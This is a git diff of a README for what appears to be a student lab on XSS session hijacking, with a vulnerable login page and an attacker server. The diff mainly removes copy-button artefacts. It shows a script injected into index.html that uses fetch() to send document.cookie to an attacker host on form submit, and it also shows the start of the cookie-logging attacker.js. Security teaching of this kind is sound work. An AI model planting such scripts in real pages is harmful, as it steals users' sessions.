@@ -68,27 +68,18 @@ Edit
 ```sh
 npm install express
 ###2️⃣ **Start the Vulnerable Web Server**
-sh
-Copy
-Edit
+
 node server.js
 The web app will start on:
-arduino
-Copy
-Edit
 http://localhost:3000
 
 ---
 
 ###3️⃣ **Start the Attacker’s Server**
-sh
-Copy
-Edit
+
 node attacker.js
+
 The attacker server will listen for stolen cookies at:
-cpp
-Copy
-Edit
 http://192.168.X.X:4000
 
 ---
@@ -99,9 +90,7 @@ This script is injected into the vulnerable login page (index.html) so that when
 ---
 
 ### 🔹 Inside index.html (before </body>)
-html
-Copy
-Edit
+
 <script>
 document.getElementById("loginForm").addEventListener("submit", function() {
     fetch("http://192.168.64.2:4000/steal?cookie=" + document.cookie);
@@ -117,9 +106,7 @@ document.getElementById("loginForm").addEventListener("submit", function() {
 This script captures and logs the stolen session cookies.
 
 ###🔹 Inside attacker.js
-javascript
-Copy
-Edit
+
 const express = require('express');
 const fs = require('fs');
 const app = express();
@@ -152,7 +139,7 @@ To prevent XSS-based session hijacking:
 5️⃣ Use Multi-Factor Authentication (MFA) to protect accounts.
 
 --------------------------------------------
-
+```
 #📌 CREDITS
 💻 Developed by: Md Tanvir Rana(AG2409), Margarita Nyman(AG2668)
 📅 Date: (2025-03-16)
